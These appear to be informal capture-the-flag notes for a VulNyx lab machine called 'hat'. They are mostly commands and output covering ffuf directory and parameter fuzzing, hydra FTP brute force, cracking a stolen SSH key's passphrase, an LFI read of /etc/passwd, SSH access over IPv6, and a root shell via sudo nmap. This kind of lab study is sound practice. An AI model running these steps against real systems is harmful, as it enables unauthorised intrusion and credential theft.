# Recon
22,80, 65535

# 22
weird - filtered.

# 80
leave for now
back here
found /logs dir and /php-scripts dir
```shell
ffuf -u http://192.168.174.131/FUZZ -w /opt/sc/directory-list-2.3-medium.txt -t 100 -c -e .php,.html,.zip,.bak,.sql
________________________________________________

index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 27ms]
logs                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 50ms]
php-scripts             [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 60ms]
```
fuzz on logs
```shell
$ ffuf -u http://192.168.174.131/logs/FUZZ -w /opt/sc/directory-list-2.3-medium.txt -t 100 -c -e .php,.html,.zip,.bak,.log
________________________________________________

index.html              [Status: 200, Size: 4, Words: 1, Lines: 5, Duration: 36ms]
vsftpd.log              [Status: 200, Size: 1760, Words: 167, Lines: 26, Duration: 69ms]
```
fuzz on php scripts
```shell
$ ffuf -u http://192.168.174.131/php-scripts/FUZZ -w /opt/sc/directory-list-2.3-medium.txt -t 100 -e .php
________________________________________________

file.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3058ms]
```
downloading and reading the ftp logs
```
[I 2021-09-28 18:44:09] 192.168.1.83:49280-[admin_ftp] USER 'admin_ftp' logged in.
[I 2021-09-28 18:44:09] 192.168.1.83:49280-[admin_ftp] FTP session closed (disconnect).
```
we have a username, bruteforce with hydra
```shell
$ hydra -l admin_ftp  -P /opt/sc/rockyou-50.txt ftp://192.168.174.131:65535 -u -t 64
[65535][ftp] host: 192.168.174.131   login: admin_ftp   password: cowboy
```
things to try:
- login on ftp see if anything is there
- fuzz the file.php file for a param -> LFI -> logpoisoning on FTP to poison ftp logs -> RCE


# 65535
typical ctf type shit, ftp on a weird port
doing a bruteforce, going back to 80
```shell

┌──(rami㉿zen)-[~/labs/vulnyx/hat]
└─$ ftp 192.168.174.131 65535
Connected to 192.168.174.131.
220 pyftpdlib 1.5.4 ready.
Name (192.168.174.131:rami): admin_ftp
331 Username ok, send password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering extended passive mode (|||40587|).
125 Data connection already open. Transfer starting.
drwxrwxrwx   2 cromiphi cromiphi     4096 Sep 28  2021 share
226 Transfer complete.
ftp> cd share
250 "/share" is the current directory.
ftp> ls -la
229 Entering extended passive mode (|||35021|).
125 Data connection already open. Transfer starting.
-rwxrwxrwx   1 cromiphi cromiphi     1751 Sep 28  2021 id_rsa
-rwxrwxrwx   1 cromiphi cromiphi      108 Sep 28  2021 note
226 Transfer complete.
ftp> mget *
No such file or directory.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering extended passive mode (|||39697|).
125 Data connection already open. Transfer starting.
100% |************************************************************************|  1751      199.94 KiB/s    00:00 ETA
226 Transfer complete.
1751 bytes received in 00:00 (179.69 KiB/s)
ftp> get note
local: note remote: note
229 Entering extended passive mode (|||60483|).
125 Data connection already open. Transfer starting.
100% |************************************************************************|   108       42.85 KiB/s    00:00 ETA
226 Transfer complete.
108 bytes received in 00:00 (29.10 KiB/s)
ftp> quit
221 Goodbye.
```
an id_rsa with a passphrase
```
┌──(rami㉿zen)-[/opt/tools/RSAcrack]
└─$ ./RSAcrack -k ~/labs/vulnyx/hat/id_rsa -w /opt/sc/rockyou-75.txt 

╭━━━┳━━━┳━━━╮          ╭╮  
┃╭━╮┃╭━╮┃╭━╮┃          ┃┃  
┃╰━╯┃╰━━┫┃ ┃┣━━┳━┳━━┳━━┫┃╭╮
┃╭╮╭┻━━╮┃╰━╯┃╭━┫╭┫╭╮┃╭━┫╰╯╯
┃┃┃╰┫╰━╯┃╭━╮┃╰━┫┃┃╭╮┃╰━┫╭╮╮
╰╯╰━┻━━━┻╯ ╰┻━━┻╯╰╯╰┻━━┻╯╰╯
-=========================-

[*] Cracking: /home/rami/labs/vulnyx/hat/id_rsa
[*] Wordlist: /opt/sc/rockyou-75.txt
[i] Status:
    1593/59186/2%/ilovemyself
[+] Password: ilovemyself Line: 1593
```
we have a username a ssh key but port 22 is filtered, going back to web

fuzz the file.php file for parameters
```
┌──(rami㉿zen)-[~/labs/vulnyx/hat]
└─$ ffuf -u http://192.168.174.131/php-scripts/file.php?FUZZ=/etc/passwd -w /opt/sc/common.txt -t 100 -fs 0
________________________________________________

6                       [Status: 200, Size: 1404, Words: 13, Lines: 27, Duration: 118ms]
```
LFI 
```bash
┌──(rami㉿zen)-[~/labs/vulnyx/hat]
└─$ curl http://192.168.174.131/php-scripts/file.php?6=/etc/passwd | grep "sh"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1404  100  1404    0     0   211k      0 --:--:-- --:--:-- --:--:--  228k
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
cromiphi:x:1000:1000:cromiphi,,,:/home/cromiphi:/bin/bash
```
ssh is filtered for ipv4 but not for v6
```
┌──(rami㉿zen)-[~/labs/vulnyx/hat]
└─$ ping6 -I eth1 ff02::1
ping6: Warning: source address might be selected on device other than: eth1
PING ff02::1 (ff02::1) from :: eth1: 56 data bytes
64 bytes from fe80::2344:1486:a8ee:5493%eth1: icmp_seq=1 ttl=64 time=0.683 ms
64 bytes from fe80::20c:29ff:fe6e:d127%eth1: icmp_seq=1 ttl=64 time=1.42 ms
64 bytes from fe80::2344:1486:a8ee:5493%eth1: icmp_seq=2 ttl=64 time=0.102 ms
64 bytes from fe80::20c:29ff:fe6e:d127%eth1: icmp_seq=2 ttl=64 time=2.27 ms
64 bytes from fe80::2344:1486:a8ee:5493%eth1: icmp_seq=3 ttl=64 time=0.076 ms
64 bytes from fe80::20c:29ff:fe6e:d127%eth1: icmp_seq=3 ttl=64 time=2.57 ms
```
ssh in 
```bash
┌──(rami㉿zen)-[~/labs/vulnyx/hat]
└─$ ssh -6 "cromiphi@fe80::20c:29ff:fe6e:d127%eth1:" -i id_rsa 
Enter passphrase for key 'id_rsa': 
Linux hat 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
cromiphi@hat:~$ whoami
cromiphi
cromiphi@hat:~$ sudo -l
Matching Defaults entries for cromiphi on hat:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cromiphi may run the following commands on hat:
    (root) NOPASSWD: /usr/bin/nmap

cromiphi@hat:~$ TF=$(mktemp) && echo 'os.execute("/bin/sh")' > $TF && sudo /usr/bin/nmap --script=$TF
Starting Nmap 7.70 ( https://nmap.org ) at 2024-04-03 04:43 CEST
NSE: Warning: Loading '/tmp/tmp.3q6dEGED1z' -- the recommended file extension is '.nse'.
# uid=0(root) gid=0(root) grupos=0(root)
# root@hat:/home/cromiphi# user.txt
root@hat:/home/cromiphi# root@hat:~#    Static hostname: hat
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 1c59a45b2d3a4d129daf9434ca768381
           Boot ID: 793b2a33e2804b6ba5173032f5a3ad5f
    Virtualization: vmware
  Operating System: Debian GNU/Linux 10 (buster)
            Kernel: Linux 4.19.0-17-amd64
      Architecture: x86-64
```
